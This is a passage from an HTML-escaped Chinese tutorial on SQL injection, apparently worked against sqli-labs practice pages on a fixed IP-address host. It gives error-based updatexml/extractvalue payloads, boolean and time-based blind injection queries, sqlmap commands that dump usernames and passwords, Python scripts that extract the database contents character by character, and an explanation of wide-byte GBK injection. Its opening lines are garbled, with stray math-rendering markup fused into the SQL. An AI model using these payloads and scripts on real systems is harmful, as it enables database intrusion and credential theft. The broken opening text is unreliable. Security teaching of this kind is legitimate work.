=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;phonenum’,’$email’,‘add’)&amp;quot;;&lt;/p&gt;
&lt;p&gt;query=&#34;insert into member(username,pw,sex,phonenum,email,address) values(&#39;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)  
and&#39; &#39;,&#39;password’,‘&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;sex&amp;#x27;,&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;phonenum’,’$email’,‘add’)&amp;quot;;&lt;br&gt;
(2) 爆表&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=‘数据库名’),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’ limit 0,1),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=‘数据库名’),0x7e)) #&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) #&lt;br&gt;
1’ and extractvalue (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=‘数据库名’ limit 0,1),0x7e)) #&lt;br&gt;
(3) 爆列&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_schema=database ()),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘表名’),0x7e),1) #&lt;br&gt;
1’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘表名’),0x7e)) #&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))#&lt;br&gt;
1’ and extractvalue (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e))#&lt;br&gt;
(4) 爆值&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (表名对应的字段名) from (数据库。表名)),0x7e),1) #&lt;/p&gt;
&lt;p&gt;1’ and extractvalue (1,concat (0x7e,(select group_concat (表名对应的字段名) from (数据库。表名)),0x7e)) #&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;各种报错注入&#34;&gt; 各种报错注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
 insert /update 注入是指我们前端注册的信息，后台会通过 insert/update 这个操作插入 / 更新到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。&lt;br&gt;
1、insert 注入：注册的信息，没有经过过滤直接带到数据库中，导致 insert 注入。&lt;br&gt;
2、update 注入：用户登陆端，没有经过过滤直接带到数据库中，导致 update 注入。&lt;br&gt;
3、dalete 注入：应用于前后端发贴、留言、用户等相关删除操作时抓包。&lt;br&gt;
4、Http Header 注入：数据库直接获取了前端的头信息没有做任何的处理导致注入。&lt;br&gt;
5、Cookie 注入：后端获取 Cookie 直接在数据库中进行拼接，那这也是一个 SQL 注入点。&lt;br&gt;
注入方法 ：在 ant [uname]=admin 后添加一个’观察反馈的 MYSQL 的语法报错，发现了存在 SQL 注入漏洞后，再插入 payload： &#39;and updatexml (1,concat (0x7e,database ()),0)#&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;布尔盲注&#34;&gt; 布尔盲注&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答 “是” 或者 “是”，因此你需要询问它这样的问题，例如 “数据库名字的第一个字母是不是 a 啊？” 通过这种机械的询问，最终获得你想要的数据。&lt;/li&gt;
&lt;li&gt;利用情景&lt;br&gt;
页面上没有显示位，并且没有输出 SQL 语句执行错误信息&lt;br&gt;
只能通过页面返回正常与不正常判断&lt;/li&gt;
&lt;li&gt;步骤&lt;br&gt;
 1. 判断是否存在注入，注入是字符型还是数字型&lt;br&gt;
 2. 猜解当前数据库名&lt;br&gt;
 3. 猜解数据库中的表名&lt;br&gt;
 4. 猜解表中的字段名&lt;br&gt;
 5. 猜解数据&lt;/li&gt;
&lt;li&gt;盲注常用函数
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;left (字符串，截取长度)&lt;/td&gt;
&lt;td&gt;从左边截取指定长度的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;length (字符串)&lt;/td&gt;
&lt;td&gt;获取字符串的长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ascii (字符串)&lt;/td&gt;
&lt;td&gt;将指定字符串进行 ascii 编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;substr (字符串，start，截取长度)&lt;/td&gt;
&lt;td&gt;截取字符串，可以指定起始位置和长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mid (字符串，start，截取长度)&lt;/td&gt;
&lt;td&gt;截取字符串，可以指定起始位置和长度&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;count()&lt;/td&gt;
&lt;td&gt;计算总数，返回匹配条件的行数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sleep(n)&lt;/td&gt;
&lt;td&gt;将程序挂起 n 秒&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;if (参数 1，参数 2，参数 3)&lt;/td&gt;
&lt;td&gt;参数 1 为条件，当参数 1 返回的结果为 true 时，执行参数 2，否则执行参数 3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;span id=&#34;手工实现布尔盲注&#34;&gt; 手工实现布尔盲注&lt;/span&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;判断是数字型还是字符型&lt;/li&gt;
&lt;li&gt;猜解数据库长度&lt;br&gt;
使用 length () 判断数据库长度，二分法可提高效率&lt;br&gt;
？id=1’ and length (database ())&amp;gt;5 --+&lt;br&gt;
?id=1’ and length(database())&amp;lt;10 --+&lt;br&gt;
?id=1’ and length(database())=8 --+&lt;br&gt;
【length=8】&lt;/li&gt;
&lt;li&gt;猜当前数据库名&lt;br&gt;
方法 1：使用 substr 函数&lt;br&gt;
？id=1’ and substr (database (),1,1)&amp;gt;‘r’–+&lt;br&gt;
?id=1’ and substr(database(),1,1)&amp;lt;‘t’–+&lt;br&gt;
?id=1’ and substr(database(),1,1)=‘s’–+&lt;br&gt;
?id=1’ and substr(database(),2,1)=‘e’–+&lt;br&gt;
…&lt;br&gt;
?id=1’ and substr(database(),8,1)=‘y’–+&lt;br&gt;
【security】&lt;br&gt;
方法 2：使用 ascii 函数和 substr 函数&lt;br&gt;
？id=1’ and ascii (substr (database (),1,1))&amp;gt;114 --+&lt;br&gt;
?id=1’ and ascii(substr(database(),1,1))&amp;lt;116 --+&lt;br&gt;
?id=1’ and ascii(substr(database(),1,1))=115 --+&lt;br&gt;
【security】&lt;br&gt;
方法 3：使用 left 函数&lt;br&gt;
？id=1’ and left (database (),1)&amp;gt;‘r’–+&lt;br&gt;
?id=1’ and left(database(),1)&amp;lt;‘t’–+&lt;br&gt;
?id=1’ and left(database(),1)=‘s’ --+&lt;br&gt;
?id=1’ and left(database(),2)=‘se’ --+&lt;br&gt;
?id=1’ and left(database(),3)=‘sec’ --+&lt;br&gt;
…&lt;br&gt;
?id=1’ and left(database(),8)=‘security’ --+&lt;br&gt;
【security】&lt;br&gt;
方法 4：使用 Burpsuite 的 Intruder 模块&lt;br&gt;
将获取数据库第一个字符的请求包拦截并发送到 Intruder 模块&lt;br&gt;
设置攻击变量以及攻击类型&lt;br&gt;
设置第一个攻击变量，这个变量是控制第几个字符的&lt;br&gt;
设置第二个攻击变量，这个变量是数据库名字符&lt;br&gt;
开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到&lt;/li&gt;
&lt;li&gt;判断表的个数&lt;br&gt;
 count () 函数是用来统计表中记录的一个函数，返回匹配条件的行数。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;?id=1’ and (select count(table_name) from information_schema.tables where table_schema=database())&amp;gt;0 --+&lt;br&gt;
?id=1’ and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+&lt;br&gt;
【4 个表】&lt;br&gt;
5. 判断表的长度&lt;br&gt;
 limit 可以被用于强制 select 语句返回指定的条数。&lt;/p&gt;
&lt;p&gt;?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+&lt;br&gt;
【第一个表长度为 6】&lt;br&gt;
?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+&lt;br&gt;
【第二个表长度为 8】&lt;br&gt;
6. 猜解表名&lt;br&gt;
方法 1：使用 substr 函数&lt;br&gt;
？id=1’ and substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1,1)&amp;gt;‘d’ --+&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&amp;gt;‘f’ --+&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=‘e’ --+&lt;br&gt;
…&lt;br&gt;
?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)=‘s’ --+&lt;br&gt;
【第一个表名为 emails】&lt;br&gt;
方法 2：使用 Burpsuite 的 Intruder 模块&lt;br&gt;
 7. 猜解字段名和字段信息&lt;br&gt;
 #确定字段个数&lt;br&gt;
？id=1’ and (select count (column_name) from information_schema.columns where table_schema=database () and table_name = ‘users’)&amp;gt;0 --+&lt;br&gt;
?id=1’ and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = ‘users’)=3 --+&lt;br&gt;
【字段个数为 3】&lt;br&gt;
# 确定字段名的长度&lt;br&gt;
？id=1’ and length ((select column_name from information_schema.columns where table_schema=database () and table_name = ‘users’ limit 0,1))&amp;gt;0 --+&lt;br&gt;
?id=1’ and length((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 0,1))=2 --+&lt;br&gt;
?id=1’ and length((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 1,1))=8 --+&lt;br&gt;
【第一个字段长度为 2，第二个字段长度为 8】&lt;br&gt;
# 猜字段名 同上使用 burp ?i&lt;br&gt;
d=1’ and substr((select column_name from information_schema.columns where table_schema=database() and table_name = ‘users’ limit 0,1),1,1)=‘i’ --+   【…id,username,password…】&lt;br&gt;
# 确定字段数据长度&lt;br&gt;
？id=1’ and length ((select username from users limit 0,1))=4 --+&lt;br&gt;
【第一个字段数据长度为 4】&lt;br&gt;
# 猜解字段数据 同上使用 burp&lt;br&gt;
?id=1’ and substr((select username from users limit 0,1),1,1)=‘d’ --+&lt;br&gt;
?id=1’ and ascii(substr((select username from users limit 0,1),1,1))&amp;gt;79 --+&lt;br&gt;
【第一个 username 数据为 dumb】&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;sqlmap实现布尔盲注&#34;&gt; （SqlMap）实现布尔盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;–batch: 用此参数，不需要用户输入，将会使用 sqlmap 提示的默认值一直运行下去。&lt;br&gt;
–technique: 选择注入技术，B:Boolean-based-blind  （布尔型盲注）&lt;br&gt;
–threads 10 : 设置线程为 10，运行速度会更快&lt;br&gt;
 #查询数据库 #【security】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” --dbs --batch --threads 10&lt;br&gt;
# 获取数据库中的表 #【emails、referers、uagents、users】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security --tables --batch --threads 10&lt;br&gt;
# 获取表中的字段名 #【id、username、password】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security -T users --columns --batch --threads 10&lt;br&gt;
# 获取字段信息 #【Dumb|Dumb、dhakkan|dumbo …】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/?id=1&lt;/a&gt;” -D security -T users -C username,password --dump --batch --threads 10&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;脚本实现布尔盲注&#34;&gt; 脚本实现布尔盲注&lt;/span&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名长度&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库名长度&lt;br&gt;
 def database_len ():&lt;br&gt;
for i in range(1, 10):&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and length(database())=%d’’’ %i&lt;br&gt;
r = requests.get(url + payload + ‘%23’) # %23 &amp;lt;==&amp;gt; --+&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
print(‘database_length:’, i)&lt;br&gt;
break&lt;br&gt;
else:&lt;br&gt;
print(i)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;database_len()&lt;br&gt;
【database_length: 8】&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;获取数据库名&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库名&lt;br&gt;
 def database_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1,9):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr(database(),%d,1)=’%s’ --+”  %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘database_name:’, name)&lt;br&gt;
database_name()&lt;br&gt;
#【database_name: security】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取数据库中表&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取数据库表&lt;br&gt;
 def tables_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 30):&lt;br&gt;
for i in ‘abcdefghijklmnopqrstuvwxyz,’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = ‘’’?id=1’ and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=’%s’ --+’’’ % (j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘table_name:’, name)&lt;br&gt;
tables_name()&lt;br&gt;
#【table_name: emails,referers,uagents,users】&lt;br&gt;
4. 获取表中字段&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取表中字段&lt;br&gt;
 def columns_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 30):&lt;br&gt;
for i in ‘abcdefghijklmnopqrstuvwxyz,’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’),%d,1)=’%s’ --+” %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘column_name:’, name)&lt;br&gt;
columns_name()&lt;br&gt;
#【column_name: id,username,password】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;获取字段值&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
# 获取字段值&lt;br&gt;
 def value ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 100):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyz,_-’:&lt;br&gt;
url = “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-5/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-5/&lt;/a&gt;”&lt;br&gt;
payload = “?id=1’ and substr((select group_concat(username,password) from users),%d,1)=’%s’ --+” %(j, i)&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
if ‘You are in’ in r.text:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘value:’, name)&lt;br&gt;
value()&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;时间盲注&#34;&gt; 时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;利用情景&lt;br&gt;
页面上没有显示位&lt;br&gt;
没有输出报错语句&lt;br&gt;
正确的 sql 语句和错误的 sql 语句页面返回一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;span id=&#34;手工实现时间盲注&#34;&gt; 手工实现时间盲注&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;?id=1&lt;br&gt;
?id=1’&lt;br&gt;
?id=1&amp;quot;&lt;br&gt;
# 不管怎么样都不报错，不管对错一直显示一个固定的页面；&lt;/p&gt;
&lt;p&gt;#判断注入点&lt;br&gt;
？id=1’ and sleep (3)–+&lt;br&gt;
# 页面响应延迟，判断存在时间延迟型注入&lt;/p&gt;
&lt;p&gt;#获取数据库名长度&lt;br&gt;
？id=1’ and if (length (database ())=8,sleep (3),1)–+&lt;/p&gt;
&lt;p&gt;#获取数据库名&lt;br&gt;
？id=1’ and if (substr (database (),1,1)=‘s’,sleep (3),1)–+&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;结合burpsuite的intruder模块爆破数据库名&#34;&gt; 结合（Burpsuite）的（Intruder）模块爆破数据库名&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;将获取数据库第一个字符的请求包拦截并发送到 Intruder 模块&lt;br&gt;
设置攻击变量以及攻击类型&lt;br&gt;
设置第一个攻击变量，这个变量是控制第几个字符的&lt;br&gt;
设置第二个攻击变量，这个变量是数据库名字符&lt;br&gt;
开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到&lt;br&gt;
 image-20200515211534056&lt;br&gt;
image-20200515211534056&lt;br&gt;
 获取表名、字段名、字段信息等数据方法同上&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;sqlmap实现时间盲注&#34;&gt; （SQLmap）实现时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;–batch: 用此参数，不需要用户输入，将会使用 sqlmap 提示的默认值一直运行下去。&lt;br&gt;
–technique: 选择注入技术，-T:Time-based blind  （基于时间延迟注入）&lt;br&gt;
–threads 10 : 设置线程为 10，运行速度会更快。&lt;br&gt;
# 查询数据库 #【security】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” --dbs --batch --threads 10&lt;br&gt;
# 获取数据库中的表 #【emails、referers、uagents、users】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security --tables --batch --threads 10&lt;br&gt;
# 获取表中的字段名 #【id、username、password】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security -T users --columns --batch --threads 10&lt;br&gt;
# 获取字段信息 #【Dumb|Dumb、dhakkan|dumbo …】&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/?id=1&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/?id=1&lt;/a&gt;” -D security -T users -C username,password --dump --batch --threads 10&lt;/p&gt;
&lt;h4&gt;&lt;span id=&#34;脚本实现时间盲注&#34;&gt; 脚本实现时间盲注&lt;/span&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名长度&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
import datetime&lt;br&gt;
# 获取数据库名长度&lt;br&gt;
 def database_len ():&lt;br&gt;
for i in range(1, 10):&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and if(length(database())=%d,sleep(3),1)–+’’’ %i&lt;br&gt;
time1 = datetime.datetime.now()&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
time2 = datetime.datetime.now()&lt;br&gt;
sec = (time2 - time1).seconds&lt;br&gt;
if sec &amp;gt;= 3:&lt;br&gt;
print(‘database_len:’, i)&lt;br&gt;
break&lt;br&gt;
else:&lt;br&gt;
print(i)&lt;br&gt;
database_len()&lt;/li&gt;
&lt;li&gt;获取数据库名&lt;br&gt;
 #coding:utf-8&lt;br&gt;
import requests&lt;br&gt;
import datetime&lt;br&gt;
# 获取数据库名&lt;br&gt;
 def database_name ():&lt;br&gt;
name = ‘’&lt;br&gt;
for j in range(1, 9):&lt;br&gt;
for i in ‘0123456789abcdefghijklmnopqrstuvwxyz_’:&lt;br&gt;
url = ‘’‘&lt;a href=&#34;http://139.224.112.182:8087/sqli1/Less-9/&#34;&gt;http://139.224.112.182:8087/sqli1/Less-9/&lt;/a&gt;’’’&lt;br&gt;
payload = ‘’’?id=1’ and if(substr(database(),%d,1)=’%s’,sleep(1),1) --+’’’ % (j,i)&lt;br&gt;
time1 = datetime.datetime.now()&lt;br&gt;
r = requests.get(url + payload)&lt;br&gt;
time2 = datetime.datetime.now()&lt;br&gt;
sec = (time2 - time1).seconds&lt;br&gt;
if sec &amp;gt;= 1:&lt;br&gt;
name = name + i&lt;br&gt;
print(name)&lt;br&gt;
break&lt;br&gt;
print(‘database_name:’, name)&lt;br&gt;
database_name()&lt;br&gt;
 获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;宽字节注入&#34;&gt; 宽字节注入&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;br&gt;
宽字节注入是利用 mysql 的一个特性，mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字【前一个 ascii 码要大于 128，才到汉字的范围】&lt;br&gt;
在 PHP 配置文件中 magic_quotes_gpc=On 或者使用 addslashes 函数，icov 函数，mysql_real_escape_string 函数、mysql_escape_string 函数等，提交的参数中如果带有单引号’，  就会被自动转义’，这样就使得多数注入攻击无效。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当输入单引号，假设这里我们使用 addslashes 转义，对应的 url 编码是：&lt;br&gt;
’ –&amp;gt;’–&amp;gt; %5c%27&lt;br&gt;
 当在前面引入一个 ASCII 大于 128 的字符【比如 % df、% aa】，url 编码变为：&lt;br&gt;
% df’ –&amp;gt; % df’ –&amp;gt; (% df%5C)%27–&amp;gt;(数据库 GBK)–&amp;gt; 運’&lt;br&gt;
前端输入 % df’时首先经过上面 addslashes 函数和浏览器 url 编码转义变成了 % df%5c%27&lt;/p&gt;
&lt;p&gt;因为数据库使用 GBK 编码的话，% df%5c 会被当作一个汉字处理，转换成了汉字” 運”，从而使 %27（单引号）逃出生天，成功绕过，利用这个特性从而可实施 SQL 注入的利用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实战&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
